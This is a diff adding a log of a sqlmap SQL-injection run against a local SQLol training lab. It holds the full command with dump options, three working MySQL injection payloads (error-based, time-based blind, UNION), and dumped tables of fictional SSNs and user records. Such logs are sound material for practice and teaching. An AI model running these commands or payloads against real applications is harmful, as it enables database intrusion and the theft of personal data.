@@ -1,0 +1,50 @@
+=================================================================================
+sqlmap -u "http://localhost/MCIR/sqlol/select.php?sanitization_level=high&sanitization_type=keyword&sanitization_params=%27&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1&location=where_int&submit=Inject%21" -p inject_string --dump --risk=1 --level=1
+
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for MySQL extending provided level (1) and risk (1) values? [Y/n] n
+GET parameter 'inject_string' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: inject_string (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 AND EXTRACTVALUE(9143,CONCAT(0x5c,0x716b716b71,(SELECT (ELT(9143=9143,1))),0x717a6b7871))&location=where_int&submit=Inject!
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 AND (SELECT 2634 FROM (SELECT(SLEEP(5)))aZXu)&location=where_int&submit=Inject!
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: sanitization_level=high&sanitization_type=keyword&sanitization_params='&query_results=all_rows&error_level=verbose&show_query=on&inject_string=1 UNION ALL SELECT CONCAT(0x716b716b71,0x4d6843727a766b714e6a51587a707449566b77584e61686f4a524171564c76456f556469706f4b54,0x717a6b7871)-- -&location=where_int&submit=Inject!
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.1
+Database: sqlol
+Table: ssn
+[5 entries]
++-------------+-----------------------+
+| ssn         | name                  |
++-------------+-----------------------+
+| 000-00-1112 | Wengdack Slobdegoob   |
+| 012-34-5678 | Herp Derper           |
+| 111-22-3333 | Peter Weiner          |
+| 666-67-6776 | Chunk MacRunfast      |
+| 999-99-9999 | SlapdeBack LovedeFace |
++-------------+-----------------------+
+
+Database: sqlol
+Table: users
+[5 entries]
++----+---------+-----------------------+
+| id | isadmin | username              |
++----+---------+-----------------------+
+| 1  | 1       | Herp Derper           |
+| 2  | 1       | SlapdeBack LovedeFace |
+| 3  | 0       | Wengdack Slobdegoob   |
+| 4  | 0       | Chunk MacRunfast      |
+| 5  | 0       | Peter Weiner          |
++----+---------+-----------------------+
+
